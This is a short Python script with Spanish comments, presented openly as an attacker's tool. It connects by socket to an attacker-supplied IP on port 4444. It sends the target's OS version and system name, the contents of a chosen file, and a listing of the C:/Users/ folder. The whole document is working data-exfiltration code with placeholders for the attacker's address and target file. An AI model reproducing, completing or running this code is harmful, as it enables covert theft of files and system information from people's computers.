import socket
import platform
import os
#INFORMACION DEL ATACANTE PARA CONEXION
IP = 'tu ip'
Port = 4444

print("[+] Iniciando Conexion...")

#CONEXION POR MEDIO DE SOCKETS

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

se_conecto_xd = s.connect_ex((IP, Port))

# CONFIRMACION DE CONEXION
if se_conecto_xd == 0:
    print("[+] Conexion Exitosa! >>>>>" + IP )
    print("--------------------------------------------")
    Envio_de_informacion = "version>> " + platform.version() + "   " + "OS>> " + platform.system() + "    Datos del txt :D >>> "
    s.sendall(Envio_de_informacion.encode())
    
    
    cwd = os.open("directorio de archivo que deseas sacar", os.O_RDWR)
    nnn = 1000
    leer = os.read(cwd, nnn)
    s.sendall(f"{leer}".encode())
    os.close( cwd )
    

  
    #busqueda de ficheros ;>
    rutinhaxd = 'C:/Users/'
    filesss = os.listdir(rutinhaxd)
    s.sendall(f"{filesss}".encode())


else: #CAGASTE XD
 print("Noooooooooo, no funciono la wea ;>!...")

